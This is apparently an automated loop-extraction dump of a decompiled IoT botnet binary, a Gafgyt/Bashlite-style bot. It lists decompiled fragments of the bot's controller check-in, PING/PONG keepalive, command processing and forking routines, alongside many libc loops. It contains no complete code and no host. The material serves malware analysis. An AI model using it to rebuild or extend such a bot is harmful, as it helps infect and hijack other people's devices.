++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19045 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 19065 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19071 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 19162 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19168 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 19220 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19226 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 19248 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19254 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 19287 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19293 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 19336 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19342 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 19412 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19418 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 19440 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19446 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 19479 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19485 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 19528 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19534 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 19729 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19735 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 19787 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19793 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 19815 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19821 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 19854 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19860 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 19903 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19909 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 19960 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19966 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 19980 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19986 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 20090 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20096 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 20128 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20134 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 20178 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20184 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 20198 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20204 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 20295 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20301 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 20333 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20339 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 20383 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20389 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 107 @ getOurIP ====================================
++++++++ WHILE START : 20908 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 21015 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v220, 0x1000, v218) != 0) {
		if (strstr(v220, "\t00000000\t", 0x10010000) != 0) {
		__libc_close(v218);
		__libc_close(v212);
		__libc_close(v212);
		__libc_close(v218);
		__libc_close(v212);
		__libc_close(v212);
		__libc_close(v218);
		__libc_close(v212);
		__libc_close(v212);
=============================WHILE LOOPS ID : 108 @ main ====================================
++++++++ WHILE START : 21506 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 21944 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		fgets(v231, 1024, v208);
		if (__GI_strcasecmp(v231, v230) == 0) {
		__GI_fclose((int16_t *)v208);
		int32_t v236 = __GI_fopen((int32_t)v209, (int32_t)&v235); // 0x1000b594
		__GI_fclose((int16_t *)v236);
		getOurIP();
		v217 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n", 0x10010000);
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		v241 = getBuild(0x10030000);
		__GI_inet_ntoa(&v240, 0x10030000);
		sockprintf(v238, (int32_t)"BUILD %s:%s", v241);
		while (true) {
		while (true) {
		if (recvLine(v211, (char *)&v212, 0x1000, v221) == -1) {
		while (true) {
		if (__libc_waitpid(v249, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v221, "PING", 0x10010000) == v221) {
		sockprintf(v211, (int32_t)"PONG", 0x10010000);
		if (strstr(v221, "DUP", 0x10010000) == v221) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n", 0x10010000);
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v274, &v227);
		processCmd(v274, &v227);
		while (true) {
		free();
		free();
		while (true) {
		if (__libc_waitpid(v249, 0, 1) < 1) {
		v241 = getBuild(0x10030000);
		__GI_inet_ntoa(&v240, 0x10030000);
		sockprintf(v238, (int32_t)"BUILD %s:%s", v241);
		__libc_waitpid(v217, (int32_t)&v214, 0);
		zprintf((int32_t)"fork failed\n", 0x10010000);
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 110 @ main ====================================
++++++++ WHILE START : 21981 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 21987 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 111 @ main ====================================
++++++++ WHILE START : 22004 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 22010 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 112 @ main ====================================
++++++++ WHILE START : 22035 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 22041 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 113 @ main ====================================
++++++++ WHILE START : 22058 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 22064 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 114 @ main ====================================
++++++++ WHILE START : 22071 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 22088 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v219, 1024, v283) == 0) {
		fdpclose(v283);
		sockprintf(v211, (int32_t)"%s", v219);
=============================WHILE LOOPS ID : 119 @ _vfprintf_internal ====================================
++++++++ WHILE START : 32298 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 32985 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 122 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 34343 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 35158 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 124 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 36112 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 36140 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 127 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 36721 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 36790 
++++++++ INTRESTING INSTRUCTIONS :  
		char v219 = getc_unlocked((int16_t *)a3, v215); // 0x1000e40c
=============================WHILE LOOPS ID : 141 @ strstr ====================================
++++++++ WHILE START : 40329 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 40392 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 149 @ gethostbyname_r ====================================
++++++++ WHILE START : 44915 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 44946 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 150 @ gethostbyname_r ====================================
++++++++ WHILE START : 45056 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 45087 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 151 @ gethostbyname_r ====================================
++++++++ WHILE START : 45191 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 45222 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 152 @ gethostbyname_r ====================================
++++++++ WHILE START : 45324 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 45360 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 153 @ gethostbyname_r ====================================
++++++++ WHILE START : 45469 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 45503 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 157 @ srandom_r ====================================
++++++++ WHILE START : 52724 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 52765 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)v214, (int32_t)&v215);
		__GI_random_r((int32_t *)v214, (int32_t)&v215);
=============================WHILE LOOPS ID : 158 @ _stdlib_strto_l ====================================
++++++++ WHILE START : 53948 
++++++++ WHILE FUNCTION : _stdlib_strto_l 
++++++++ WHILE END : 54217 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 163 @ __stdio_WRITE ====================================
++++++++ WHILE START : 60503 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 60588 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 166 @ _fpmaxtostr ====================================
++++++++ WHILE START : 62369 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 66044 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 174 @ __GI_strpbrk ====================================
++++++++ WHILE START : 68293 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 68323 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 175 @ inet_aton ====================================
++++++++ WHILE START : 68549 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 68622 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 176 @ __dns_lookup ====================================
++++++++ WHILE START : 68876 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 69503 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_close(v226);
		if (inet_pton(10, (char *)v236, (int32_t)&v237) < 1) {
		inet_addr(v236);
		int32_t v240 = socket((int32_t)v239, 2, 17); // 0x10012614
		if (__libc_connect(v223, 28, 28) > -1) {
		__libc_send(v210, v207, result + v243, 0);
		int32_t v244 = __libc_recv(v210, v207, 512, 0); // 0x10012694
		__libc_close(v212);
		free();
		free();
		while (true) {
		__libc_close(v210);
		free();
		free();
		free();
		free();
		free();
		free();
		__libc_close(v210);
		free();
		free();
		free();
		__libc_close(v210);
		free();
		free();
		free();
		__libc_close(v210);
		free();
		free();
		free();
		__libc_close(v210);
		free();
		free();
		free();
		__libc_close(v210);
		free();
		free();
		free();
		free();
		__libc_close(v212);
		free();
		free();
		__libc_close(v212);
		free();
		free();
		__libc_close(v212);
		free();
		free();
=============================WHILE LOOPS ID : 177 @ __open_nameservers ====================================
++++++++ WHILE START : 69850 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 70048 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v216, 128, v212) == 0) {
		__GI_fclose((int16_t *)v211);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		free();
		free();
		while (true) {
=============================WHILE LOOPS ID : 179 @ __GI_strncat ====================================
++++++++ WHILE START : 74271 
++++++++ WHILE FUNCTION : __GI_strncat 
++++++++ WHILE END : 74320 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 185 @ inet_pton ====================================
++++++++ WHILE START : 75474 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 75719 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		if (inet_pton4(v219, v217) > 0) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 188 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 76343 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 76490 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_ntop4(a2 + 12, v252, v253 - v252 + 86) == 0) {
		v250 = sprintf(v252, (int32_t)"%x", v249, v213, v245, v246, v213, (int32_t)&v251);
		if (inet_ntop4(a2 + 12, v252, v253 - v252 + 86) == 0) {
		v250 = sprintf(v247, (int32_t)"%x", v249, v213, v245, v246, v213, (int32_t)&v251);
=============================WHILE LOOPS ID : 191 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 78243 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 78256 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v214, v216, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 192 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 78298 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 78311 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v214, v216, a1) != 0) {
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 193 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 78347 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 78579 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v214, v216, a1) != 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(a2, v250) == 0) {
		if (inet_pton(2, (char *)v252, v215) > 0) {
		__GI_fclose((int16_t *)a1);
		if (inet_pton(10, (char *)v253, v213) > 0) {
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
		__GI_fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 194 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 78630 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 78643 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v214, v216, a1) != 0) {
		__GI_fclose((int16_t *)a1);
